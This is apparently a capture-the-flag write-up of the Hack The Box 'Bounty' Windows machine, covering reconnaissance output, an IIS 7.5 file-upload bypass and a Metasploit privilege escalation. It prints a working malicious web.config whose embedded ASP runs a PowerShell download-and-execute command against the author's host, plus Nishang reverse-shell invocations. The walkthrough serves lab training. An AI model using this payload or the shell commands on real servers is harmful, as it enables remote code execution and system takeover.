---
title:     "Hack The Box - Bounty"
tags: [windows,easy,file-upload-vuln,isi]
---

![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-bounty/1.png)

We are going to pwn Bounty from Hack The Box.

Link : <https://www.hackthebox.eu/home/machines/profile/142>


Lets Begin with our Initial Nmap Scan.

Nmap Scan Results:

```

PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Bounty
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone|specialized
Running (JUST GUESSING): Microsoft Windows 2008|7|Vista|Phone|8.1|2012 (91%)
OS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_server_2012
Aggressive OS guesses: Microsoft Windows 7 or Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (91%), Microsoft Windows 7 (91%), Microsoft Windows 7 Professional or Windows 8 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (91%), Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7 (91%), Microsoft Windows Vista SP2 (91%), Microsoft Windows Server 2008 R2 SP1 (90%), Microsoft Windows Vista SP2, Windows 7 SP1, or Windows Server 2008 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```
## HTTP:
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-bounty/2.png)

Nothing interesting, lets run ``Gobuster``.

Gobuster Scan Results:

```
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.93
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/03/09 19:03:45 Starting gobuster
===============================================================
/aspnet_client (Status: 301)
/transfer.aspx (Status: 200)
/uploadedfiles (Status: 301)
===============================================================
2020/03/09 19:10:48 Finished
===============================================================

```

``/transfer.aspx`` 

![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-bounty/3.png)

There is a file upload options so I guess we can upload a reverse shell here and access them in ``/uploadedfiles``

## Test:

I uploaded ``wolf.jpg`` and it Successfully Uploaded

![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-bounty/4.png)

``/uploadedfiles/wolf.jpg``
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-bounty/5.png)

So I tried uploading ``.aspx`` file and I get Invalid File.<br/>
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-bounty/6.png)

I googled about ISI 7.5 exploits and found there is a RCE via uploading ``web.config``.

> Reference https://sethjackson.github.io/2018/10/27/rce-through-web-config-upload/

So I used [Nishang](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) to get shell.

If we look at the Shell it gives us some of the examples.

```
.EXAMPLE
PS > Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444

Above shows an example of an interactive PowerShell reverse connect shell. A netcat/powercat listener must be listening on 
the given IP and port. 

.EXAMPLE
PS > Invoke-PowerShellTcp -Bind -Port 4444

Above shows an example of an interactive PowerShell bind connect shell. Use a netcat/powercat to connect to this port. 

.EXAMPLE
PS > Invoke-PowerShellTcp -Reverse -IPAddress fe80::20c:29ff:fe9d:b983 -Port 4444
```
I copied one of the example and changed it to my IP and paste it in bottom of the file. <br/>
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-bounty/7.png)<br/>
This not only load the module but also the shell give me a callback.

Started python server.

``web.config``

```
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />         
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
<!-- ASP code comes here! It should not include HTML comment closing tag and double dashes!
<% Response.write("-"&"->") %>

<%
Set rs = CreateObject("WScript.Shell")
Set cmd = rs.Exec("cmd /c powershell -c IEX (New-Object Net.Webclient).downloadstring('http://10.10.14.22:8000/Invoke-PowerShellTcp.ps1')")
o = cmd.StdOut.Readall()
Response.write(o)
%>

<% Response.write("<!-"&"-") %>
-->
```

Uploaded ``web.config``<br/>
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-bounty/8.png)

Now I need to visit ``10.10.10.93/uploadedfiles/web.config`` and I will get the shell.

``Status 200`` means it successfully downloaded to the box. And NC give me the shell.
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-bounty/9.png)

I changed to Metasploit

``systeminfo``

```
Host Name:                 BOUNTY
OS Name:                   Microsoft Windows Server 2008 R2 Datacenter 
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                55041-402-3606965-84760
Original Install Date:     5/30/2018, 12:22:24 AM
System Boot Time:          3/9/2020, 6:53:24 PM
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory:     2,047 MB
Available Physical Memory: 1,573 MB
Virtual Memory: Max Size:  4,095 MB
Virtual Memory: Available: 3,575 MB
Virtual Memory: In Use:    520 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) PRO/1000 MT Network Connection
                                 Connection Name: Local Area Connection
                                 DHCP Enabled:    No
                                 IP address(es)
```

Where ``Hotfix(s): N/A`` which means the system is not updated so far.

> A hotfix or quick-fix engineering update is a single, cumulative package that includes information that is used to address a problem in a software product.

We can try ``local_exploit_suggester`` this will give us some suggestions to exploit. Before that we need to ``migrate`` process inorder to make it stable. So I won’t face any errors while using any exploit. 

![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-bounty/10.png)

Now Background the session and run ``local_exploit_suggester``.
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-bounty/11.png)

It displayes a lot of vulnerable so I chose random one ``windows/local/ms10_092_schelevator``
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-bounty/12.png)

Got Authority\System